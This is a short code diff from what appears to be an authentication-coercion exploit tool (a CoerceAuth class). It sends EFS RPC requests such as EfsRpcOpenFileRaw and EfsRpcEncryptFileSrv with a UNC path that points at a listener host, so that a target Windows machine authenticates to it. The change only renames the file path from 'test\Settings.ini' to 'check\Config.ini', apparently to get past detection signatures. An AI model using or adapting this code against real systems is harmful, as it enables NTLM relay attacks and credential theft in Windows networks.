@@ -374,7 +374,7 @@ class CoerceAuth():
         print("[-] Sending EfsRpcOpenFileRaw!")
         try:
             request = EfsRpcOpenFileRaw()
-            request['fileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
+            request['fileName'] = '\\\\%s\\check\\Config.ini\x00' % listener
             request['Flag'] = 0
             #request.dump()
             resp = dce.request(request)
@@ -391,7 +391,7 @@ class CoerceAuth():
                 print("[-] Sending EfsRpcEncryptFileSrv!")
                 try:
                     request = EfsRpcEncryptFileSrv()
-                    request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
+                    request['FileName'] = '\\\\%s\\check\\Config.ini\x00' % listener
                     resp = dce.request(request)
                 except Exception as e:
                     if str(e).find('ERROR_BAD_NETPATH') >= 0:
